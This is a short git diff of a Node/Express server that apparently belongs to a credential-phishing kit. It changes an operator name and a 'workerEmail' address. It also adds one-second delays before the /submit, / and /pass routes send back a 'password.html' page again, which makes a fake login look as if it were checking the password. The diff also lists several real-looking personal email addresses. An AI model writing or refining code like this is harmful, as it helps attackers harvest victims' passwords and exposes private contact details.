@@ -10,13 +10,13 @@ app.use(express.static(path.join(__dirname,'static')))
 app.use(express.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 
-const name = "Molu"
+const name = "Rashid"
 const emails = [
   "unaisnizamani598@gmail.com",
   "marina.bhoo.so@gmail.com",
   
 ]
-const workerEmail = "official.tereza.tarot.ads@gmail.com";
+const workerEmail = "official.ada.marnes.wood@gmail.com";
 
 
 
@@ -74,9 +74,10 @@ app.post("/submit", async (req, res) => {
   }
 
 
-  res.sendFile(path.join(__dirname, "password.html"));
+  setTimeout(()=>{
+    res.sendFile(path.join(__dirname, "password.html"));
+ },1000)
 
-  
 });
 
 
@@ -95,7 +96,10 @@ app.post("/", async (req, res) => {
   }
 
 
-  res.sendFile(path.join(__dirname, "password.html"));
+  setTimeout(()=>{
+    res.sendFile(path.join(__dirname, "password.html"));
+ },1000)
+
 
   
 });
@@ -121,8 +125,10 @@ app.post('/pass',(req,res)=>{
   }
 
 
+  setTimeout(()=>{
+    res.sendFile(path.join(__dirname, "password.html"));
+ },1000)
 
-  res.sendFile(path.join(__dirname, "password.html"));
 })
 
 
